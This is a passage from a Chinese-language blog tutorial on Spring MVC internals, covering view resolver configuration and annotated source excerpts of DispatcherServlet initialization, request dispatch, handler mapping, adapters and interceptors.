</li>
<li>XML视图<ul>
<li>MappingJackson2XmlView：将模型数据封装成 XML 格式数据，从4. 版本之后才加入的。</li>
</ul>
</li>
</ul>
<h3 id="视图解析器"><a href="#视图解析器" class="headerlink" title="视图解析器"></a>视图解析器</h3><p>视图解析器ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名，即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户。视图对象是由视图解析器负责实例化。</p>
<p>所有的视图解析器都必须实现ViewResolver接口。SpringMVC为逻辑视图名的解析提供了不同的策略，可以在 Spring上下文中配置一种或多种解析策略，并指定他们之间的先后顺序。每一种映射策略对应一个具体的视图解析器实现类。程序员可以选择一种视图解析器或混用多种视图解析器。可以通过<code>order</code>属性指定解析器的优先顺序，<code>order</code>越小优先级越高。SpringMVC 会按视图解析器顺序的优先顺序对逻辑视图名进行解析，直到解析成功并返回视图对象，否则抛出ServletException异常。</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>视图解析器类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>解析为Bean的名称</td>
<td>BeanNameViewResolver</td>
<td>Bean的id即为逻辑视图名称</td>
</tr>
<tr>
<td>解析为URL文件</td>
<td>InternalResourceViewResolver</td>
<td>将视图名解析成一个URL文件，一般就是一个jsp或html，一般放在WEB-INF目录下</td>
</tr>
<tr>
<td>解析指定 XML 文件</td>
<td>XmlViewResolver</td>
<td>解析指定位置的XML文件，默认在&#x2F;WEB-INF&#x2F;views.xml</td>
</tr>
<tr>
<td>解析指定属性文件</td>
<td>ResourceBundleViewResolver</td>
<td>解析properties文件</td>
</tr>
</tbody></table>
<p>在<code>spring-mvc.xml</code>中配置视图解析器：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">   <span class="comment">&lt;!-- jsp --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">id</span>=<span class="string">&quot;jspViewResolver&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/jsp/&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;viewNames&quot;</span> <span class="attr">value</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 模板优先级别 --&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;order&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">&lt;!-- html --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">id</span>=<span class="string">&quot;htmlViewResolver&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/html/&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.html&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;viewNames&quot;</span> <span class="attr">value</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 模板优先级别 --&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;order&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然视图解析器不是必要的，在如今流行的前后端开发模式下，即基于ajax的异步请求，用json数据交互时（<code>@RequestBody</code>与<code>@ResponseBody</code>），可以不配置任何视图解析器。</p>
<h1 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h1><h2 id="前端控制器-1"><a href="#前端控制器-1" class="headerlink" title="前端控制器"></a>前端控制器</h2><p>前端控制器对应DispatcherServlet类，是整个SpringMvc的核心</p>
<h3 id="启动和初始化"><a href="#启动和初始化" class="headerlink" title="启动和初始化"></a>启动和初始化</h3><p>Tomcat在启动时会调用所有Servlet的<code>init</code>方法，其中就包括了DispatcherServlet。</p>
<p>它的<code>init</code>方法在父类HttpServletBean中实现：</p>
<p>父类HttpServletBean中有</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set bean properties from init parameters.</span></span><br><span class="line">    ...........</span><br><span class="line">        <span class="comment">// Let subclasses do whatever initialization they like.</span></span><br><span class="line">        <span class="comment">// 调用子类FrameworkServlet的initServletBean方法</span></span><br><span class="line">        initServletBean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FrameworkServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">initServletBean</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    ....</span><br><span class="line">        <span class="comment">//一些Log</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//调用initWebApplicationContext()方法</span></span><br><span class="line">            <span class="built_in">this</span>.webApplicationContext = initWebApplicationContext();</span><br><span class="line">            initFrameworkServlet();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ServletException | RuntimeException ex) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Context initialization failed&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">        <span class="comment">//一些Log</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> WebApplicationContext <span class="title function_">initWebApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">WebApplicationContext</span> <span class="variable">wac</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	...</span><br><span class="line">       <span class="comment">// 创建WebApplicationContext容器</span></span><br><span class="line">	wac = createWebApplicationContext(rootContext);</span><br><span class="line">	<span class="comment">// 调用子类DispatcherServlet的onRefresh方法</span></span><br><span class="line">	onRefresh(wac);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前端控制器DispatcherServlet：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="comment">//刷新上下文</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onRefresh</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">    <span class="comment">//调用DispatcherServlet的initStrategies方法</span></span><br><span class="line">    initStrategies(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initStrategies</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">    initMultipartResolver(context);</span><br><span class="line">    initLocaleResolver(context);</span><br><span class="line">    initThemeResolver(context);</span><br><span class="line">    <span class="comment">//初始化处理器映射器	</span></span><br><span class="line">    initHandlerMappings(context);</span><br><span class="line">    <span class="comment">//初始化处理器适配器</span></span><br><span class="line">    initHandlerAdapters(context);</span><br><span class="line">    initHandlerExceptionResolvers(context);</span><br><span class="line">    initRequestToViewNameTranslator(context);</span><br><span class="line">    <span class="comment">//初始化视图解析器</span></span><br><span class="line">    initViewResolvers(context);</span><br><span class="line">    initFlashMapManager(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initHandlerMappings</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.handlerMappings = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.detectAllHandlerMappings) &#123;</span><br><span class="line">        <span class="comment">// 这里会找到注解使用的处理器映射器RequestMappingHandlerMapping</span></span><br><span class="line">        <span class="comment">//其中保存了所有控制器中[请求路径]和[方法]的对应集合Map</span></span><br><span class="line">        Map&lt;String, HandlerMapping&gt; matchingBeans =</span><br><span class="line">            BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (!matchingBeans.isEmpty()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handlerMappings = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(matchingBeans.values());</span><br><span class="line">            <span class="comment">// We keep HandlerMappings in sorted order.</span></span><br><span class="line">            AnnotationAwareOrderComparator.sort(<span class="built_in">this</span>.handlerMappings);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>初始化操作结束，完成了一系列元器件的配置和初始化。</p>
<h3 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h3><p>初始化流程大致了解完了，SpringMVC如何处理一个请求？客户端请求到达后，根据Servlet规范，首先会调用父类HttpServlet的<code>service</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">     <span class="keyword">throws</span> ServletException, IOException</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> req.getMethod();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 通过不同的请求方式调用不同的方法</span></span><br><span class="line">     <span class="comment">// 最后都会来到子类FrameworkServlet的processRequest</span></span><br><span class="line">     <span class="keyword">if</span> (method.equals(METHOD_GET)) &#123;</span><br><span class="line">...</span><br><span class="line">         doGet(req, resp);</span><br><span class="line">         ...</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">processRequest</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                                       HttpServletResponse response)</span></span><br><span class="line">		<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// 调用子类DispatcherServlet的doService方法</span></span><br><span class="line">	doService(request, response);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们走进DispatcherServlet来查看后续操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    logRequest(request);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Keep a snapshot of the request attributes in case of an include,</span></span><br><span class="line">    <span class="comment">// to be able to restore the original attributes after the include.</span></span><br><span class="line">    Map&lt;String, Object&gt; attributesSnapshot = <span class="literal">null</span>;</span><br><span class="line">    ........</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置属性！√</span></span><br><span class="line">        request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());</span><br><span class="line">    request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, <span class="built_in">this</span>.localeResolver);</span><br><span class="line">    request.setAttribute(THEME_RESOLVER_ATTRIBUTE, <span class="built_in">this</span>.themeResolver);</span><br><span class="line">    request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doDispatch(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们走进doDispatch方法√！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//请求处理器的核心</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">processedRequest</span> <span class="operator">=</span> request;</span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">mappedHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">multipartRequestParsed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="type">WebAsyncManager</span> <span class="variable">asyncManager</span> <span class="operator">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Exception</span> <span class="variable">dispatchException</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;	</span><br><span class="line">            <span class="comment">//检查当前请求是否是文件上传</span></span><br><span class="line">            processedRequest = checkMultipart(request);</span><br><span class="line">            multipartRequestParsed = (processedRequest != request);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Determine handler for the current request.</span></span><br><span class="line">            <span class="comment">// 1.调用getHandler方法，通过处理器映射器HandlerMapping找到调用链</span></span><br><span class="line">            <span class="comment">// HandlerExecutionChain，其中包含一个Handler和一个拦截器数组</span></span><br><span class="line">            mappedHandler = getHandler(processedRequest);</span><br><span class="line">            <span class="comment">//如果为空，说明没有匹配的处理器</span></span><br><span class="line">            <span class="keyword">if</span> (mappedHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">                noHandlerFound(processedRequest, response);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">			<span class="comment">// 2.获取处理器适配器HandlerAdapter</span></span><br><span class="line">            <span class="comment">// 传入调用链HandlerExecutionChain中的处理器handler</span></span><br><span class="line">            <span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Process last-modified header, if supported by the handler.</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isGet</span> <span class="operator">=</span> <span class="string">&quot;GET&quot;</span>.equals(method);</span><br><span class="line">            <span class="keyword">if</span> (isGet || <span class="string">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">			<span class="comment">// 调用拦截器的前置方法</span></span><br><span class="line">            <span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Actually invoke the handler.</span></span><br><span class="line">            <span class="comment">// 3.通过处理器适配器HandlerAdapter调用处理器Handler</span></span><br><span class="line">           	<span class="comment">// 返回一个ModelAndView</span></span><br><span class="line">            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            applyDefaultViewName(processedRequest, mv);</span><br><span class="line">            <span class="comment">//执行拦截器的后置方法</span></span><br><span class="line">            mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            dispatchException = ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable err) &#123;</span><br><span class="line">            <span class="comment">// As of 4.3, we&#x27;re processing Errors thrown from handler methods as well,</span></span><br><span class="line">            <span class="comment">// making them available for @ExceptionHandler methods and other scenarios.</span></span><br><span class="line">            dispatchException = <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler dispatch failed&quot;</span>, err);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4.处理ModelAndView</span></span><br><span class="line">        <span class="comment">// 调用视图解析器ViewResolver</span></span><br><span class="line">        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">    &#125;.............</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="comment">// Instead of postHandle and afterCompletion</span></span><br><span class="line">            <span class="keyword">if</span> (mappedHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Clean up any resources used by a multipart request.</span></span><br><span class="line">            <span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">                cleanupMultipart(processedRequest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到源码给我们的表现为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取处理器执行链[处理器映射器]</span></span><br><span class="line">mappedHandler = getHandler(processedRequest);</span><br><span class="line"><span class="comment">//获得处理器适配器</span></span><br><span class="line"><span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"><span class="comment">//进行拦截器前置方法配置</span></span><br><span class="line">mappedHandler.applyPreHandle(processedRequest, response);</span><br><span class="line"><span class="comment">//使用处理器适配器完成Controller方法调用</span></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"><span class="comment">//拦截器后置方法配置</span></span><br><span class="line">mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line"><span class="comment">//视图解析器解析</span></span><br><span class="line">processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br></pre></td></tr></table></figure>

<p>整体的代码流程就是如上述所示，接下来我们按顺序分析各个内部实现</p>
<h3 id="处理器映射器-1"><a href="#处理器映射器-1" class="headerlink" title="处理器映射器"></a>处理器映射器</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 通过处理器映射器handlerMapping找到调用链HandlerExecutionChain</span></span><br><span class="line">    <span class="comment">// 如果handleMapping不为空</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 变量handlerMappings处理器映射器</span></span><br><span class="line">        <span class="keyword">for</span> (HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line">            <span class="comment">// 调用处理器映射器的getHandler方法</span></span><br><span class="line">            <span class="comment">// 可以根据请求找到匹配的调用链HandlerExecutionChain</span></span><br><span class="line">            <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">            <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> handler;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 调用子类的getHandlerInternal方法找到处理器handler</span></span><br><span class="line">   	<span class="comment">// 包括AbstractHandlerMethodMapping和AbstractUrlHandlerMapping</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getHandlerInternal(request);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//如果为空，就拿默认的</span></span><br><span class="line">        handler = getDefaultHandler();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//依旧为空 直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Bean name or resolved handler?</span></span><br><span class="line">    <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">handlerName</span> <span class="operator">=</span> (String) handler;</span><br><span class="line">        handler = obtainApplicationContext().getBean(handlerName);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// 通过getHandlerExecutionChain方法拿到调用链HandlerExecutionChain</span></span><br><span class="line">   <span class="comment">// 该方法中会获取拦截器</span></span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">executionChain</span> <span class="operator">=</span> getHandlerExecutionChain(handler, request);</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CorsUtils.isCorsRequest(request)) &#123;</span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">globalConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.corsConfigurationSource.getCorsConfiguration(request);</span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">handlerConfig</span> <span class="operator">=</span> getCorsConfiguration(handler, request);</span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (globalConfig != <span class="literal">null</span> ? globalConfig.combine(handlerConfig) : handlerConfig);</span><br><span class="line">        executionChain = getCorsHandlerExecutionChain(request, executionChain, config);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> executionChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>处理器映射器的作用主要就是根据请求，获取处理器调用链HandlerExecutionChain返回给前端控制器。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/18/O2NZKgqp6PIaTFk.jpg"
                      alt="Screenshot_85.jpg"
                ></p>
<p>可以发现映射器发现了处理器调用链，确定了调用的是谁。</p>
<h3 id="处理器适配器-1"><a href="#处理器适配器-1" class="headerlink" title="处理器适配器"></a>处理器适配器</h3><p>还记得我们怎么认为适配器的吗？</p>
<p><strong>我们可以把公共的功能都定义在适配器中，从而减少每种控制器中都有的重复性代码</strong></p>
<p>在前端控制器DispatcherServlet中调用<code>getHandlerAdapter</code>方法获取一个处理器适配器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span></span><br><span class="line"><span class="keyword">protected</span> HandlerAdapter <span class="title function_">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="comment">//如果handlerAdapters为空直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerAdapters为空直接返回 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (HandlerAdapter adapter : <span class="built_in">this</span>.handlerAdapters) &#123;</span><br><span class="line">            <span class="comment">//handlerAdapters中有handlerAdapter合适就直接返回</span></span><br><span class="line">            <span class="comment">// 判断当前的HandlerAdapter是否支持调用HandlerExecutionChain	</span></span><br><span class="line">            <span class="keyword">if</span> (adapter.supports(handler)) &#123;</span><br><span class="line">                <span class="keyword">return</span> adapter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>拦截器有前置方法和后置方法，这里统一分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前置方法</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">applyPreHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//获取拦截器</span></span><br><span class="line">    HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">    <span class="comment">//不为空</span></span><br><span class="line">    <span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; interceptors.length; i++) &#123;</span><br><span class="line">            <span class="comment">//遍历拦截器集合</span></span><br><span class="line">            <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> interceptors[i];</span><br><span class="line">            <span class="comment">//调用preHandle方法</span></span><br><span class="line">            <span class="comment">//根据自定义的拦截器的前置方法的配置 </span></span><br><span class="line">            <span class="comment">// 如果preHandle方法如果返回false 说明在这里被拦截了，那就暂时停下来</span></span><br><span class="line">            <span class="comment">// 如果返回true 那么接着看后续的拦截器，看是否通过</span></span><br><span class="line">            <span class="keyword">if</span> (!interceptor.preHandle(request, response, <span class="built_in">this</span>.handler)) &#123;</span><br><span class="line">                triggerAfterCompletion(request, response, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.interceptorIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置方法</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">applyPostHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, <span class="meta">@Nullable</span> ModelAndView mv)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//照旧获取所有拦截器</span></span><br><span class="line">    HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">    <span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">        <span class="comment">//从最后一个拦截器到第一个拦截器</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> interceptors.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> interceptors[i];</span><br><span class="line">            <span class="comment">//调用后置方法</span></span><br><span class="line">            interceptor.postHandle(request, response, <span class="built_in">this</span>.handler, mv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到后置方法的调用是每一个都必须被调用的，从尾到前。</p>
